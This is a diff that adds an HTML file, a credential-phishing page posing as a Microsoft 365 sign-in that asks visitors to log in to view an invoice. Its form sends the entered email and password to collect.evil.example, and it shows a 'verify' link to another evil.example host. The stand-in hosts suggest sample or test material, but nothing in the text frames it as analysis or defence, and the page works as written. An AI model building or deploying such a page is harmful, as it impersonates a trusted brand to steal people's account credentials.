@@ -1,0 +1,16 @@
+<html><head><title>Microsoft 365 - Sign in</title>
+<style>body { font-family: sans-serif; margin: 40px; } .box { border: 1px solid #ccc; padding: 20px; width: 320px; }</style>
+</head>
+<body>
+<div class="box">
+<h2>Sign in to view your invoice</h2>
+<form action="https://collect.evil.example/post.php" method="post">
+<input type="email" name="login" placeholder="someone@example.com"><br><br>
+<input type="password" name="passwd" placeholder="Password"><br><br>
+<button type="submit">Next</button>
+</form>
+<p id="note">Verify at https://verify.evil.example/now</p>
+</div>
+<script>document.getElementById('note').textContent = 'Verify at https://verify.evil.example/now';</script>
+
+</body><style>[style*="ActiveText"] { background-color: rgb(0, 102, 204) !important; }</style></html>
